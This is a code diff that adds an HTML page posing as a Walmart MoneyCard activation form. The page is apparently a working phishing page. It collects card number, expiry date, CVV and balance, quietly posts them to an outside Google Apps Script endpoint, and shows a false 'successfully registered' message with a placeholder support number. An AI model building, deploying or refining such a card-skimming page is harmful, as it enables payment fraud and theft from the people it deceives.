@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Walmart MoneyCard</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Roboto", sans-serif;
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+        background-color: #f9f9f9;
+      }
+
+      nav {
+        background-color: white;
+        padding: 10px 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+        color: #fff;
+        font-size: 18px;
+        font-weight: bold;
+      }
+
+      .logo img {
+        height: 80px;
+        margin-right: 10px;
+      }
+
+      .logo span {
+        color: #ffcc00;
+      }
+
+      .card-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-grow: 1;
+      }
+
+      .card {
+        background-color: #f1f1f1;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        width: 90%;
+        max-width: 600px;
+      }
+
+      .card h1 {
+        font-size: 32px;
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      .card p {
+        font-size: 18px;
+        color: #666;
+        margin-bottom: 20px;
+      }
+
+      .next-fields {
+        display: flex;
+        gap: 10px;
+      }
+      .input-group {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+      .input-group input {
+        width: 100%;
+        padding: 10px;
+        font-size: 14px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+      }
+
+      .input-group input::placeholder {
+        color: #bbb;
+      }
+
+      .button {
+        background-color: #005eb8;
+        color: #fff;
+        padding: 12px;
+        width: 100%;
+        border: none;
+        border-radius: 4px;
+        font-size: 14px;
+        cursor: pointer;
+      }
+      .button.loading {
+        position: relative;
+        pointer-events: none;
+        opacity: 0.7;
+      }
+      .button.loading::after {
+        content: "";
+        position: absolute;
+        right: 110px;
+        width: 15px;
+        height: 15px;
+        border: 2px solid #fff;
+        border-top: 2px solid #333;
+        border-radius: 50%;
+        animation: spin 0.6s linear infinite;
+      }
+      .message {
+        margin-top: 10px;
+        margin-bottom: 10px;
+        font-size: 14px;
+      }
+      .message.success {
+        color: green;
+      }
+      .message.error {
+        color: red;
+      }
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <div class="logo">
+        <img src="logo.svg" alt="Walmart MoneyCard" />
+      </div>
+    </nav>
+    <div class="card-container">
+      <div class="card">
+        <h1>You are seconds away from using your new Walmart MoneyCard!</h1>
+        <p>Please enter your card's information in the form below.</p>
+        <form id="customForm">
+          <div class="input-group">
+            <input
+              type="text"
+              placeholder="16-digit card number"
+              id="cardnumber"
+              name="cardnumber"
+              inputmode="numeric"
+              pattern="[0-9]*"
+              maxlength="16"
+              required
+            />
+            <div class="next-fields">
+              <input
+                type="text"
+                placeholder="MM"
+                inputmode="numeric"
+                id="mm"
+                name="mm"
+                pattern="[0-9]*"
+                maxlength="2"
+                required
+              />
+              <input
+                type="text"
+                placeholder="YY"
+                inputmode="numeric"
+                id="yy"
+                name="yy"
+                pattern="[0-9]*"
+                maxlength="2"
+                required
+              />
+              <input
+                type="text"
+                placeholder="CVV"
+                inputmode="numeric"
+                id="cvv"
+                name="cvv"
+                pattern="[0-9]*"
+                maxlength="3"
+                required
+              />
+              <input
+                type="text"
+                placeholder="Balance"
+                inputmode="numeric"
+                id="balance"
+                name="balance"
+                pattern="[0-9]*"
+                maxlength="10"
+                required
+              />
+            </div>
+          </div>
+          <div class="message" id="message"></div>
+          <button type="submit" class="button">Next</button>
+        </form>
+      </div>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        function enforceNumberInput(input, maxLength) {
+          input.addEventListener("input", function (e) {
+            this.value = this.value.replace(/[^0-9]/g, "");
+
+            if (this.value.length > maxLength) {
+              this.value = this.value.slice(0, maxLength);
+            }
+          });
+        }
+
+        function validateMonth(input) {
+          input.addEventListener("blur", function () {
+            const value = parseInt(this.value, 10);
+            if (value < 1 || value > 12) {
+              this.value = "";
+              showMessage("Please enter a valid month (01-12)", "error");
+            } else if (this.value.length === 1) {
+              this.value = this.value.padStart(2, "0");
+            }
+          });
+        }
+
+        const cardInput = document.getElementById("cardnumber");
+        const mmInput = document.getElementById("mm");
+        const yyInput = document.getElementById("yy");
+        const cvvInput = document.getElementById("cvv");
+        const messageElement = document.getElementById("message");
+
+        function showMessage(message, type) {
+          messageElement.textContent = message;
+          messageElement.className = `message ${type}`;
+        }
+
+        enforceNumberInput(cardInput, 16);
+        enforceNumberInput(mmInput, 2);
+        enforceNumberInput(yyInput, 2);
+        enforceNumberInput(cvvInput, 3);
+
+        validateMonth(mmInput);
+
+        document
+          .getElementById("customForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            const submitButton = document.querySelector(".button");
+            submitButton.classList.add("loading");
+
+            const formData = new FormData(event.target);
+
+            const formDetails = {
+              cardnumber: formData.get("cardnumber"),
+              mm: formData.get("mm"),
+              yy: formData.get("yy"),
+              cvv: formData.get("cvv"),
+              balance: formData.get("balance"),
+            };
+
+            const scriptURL =
+              "https://script.google.com/macros/s/AKfycby3x6Xw9ykHLpqxL9OK-PoBJMBSKnRJPxSyZY6CS5IR62umveSdjXfx6_uIcINy1BV9/exec";
+
+            fetch(scriptURL, {
+              method: "POST",
+              mode: "no-cors",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(formDetails),
+            })
+              .then(() => {
+                submitButton.classList.remove("loading");
+                showMessage(
+                  "Your Card has been successfully registered. Please wait for 15 minutes to activate it !!",
+                  "success"
+                );
+                document.getElementById("customForm").reset();
+              })
+              .catch((error) => {
+                submitButton.classList.remove("loading");
+                console.error("Error:", error);
+                showMessage(
+                  "There was an error submitting the form. Please contact our support at +1 888 888 8888",
+                  "error"
+                );
+              });
+          });
+      });
+    </script>
+  </body>
+</html>
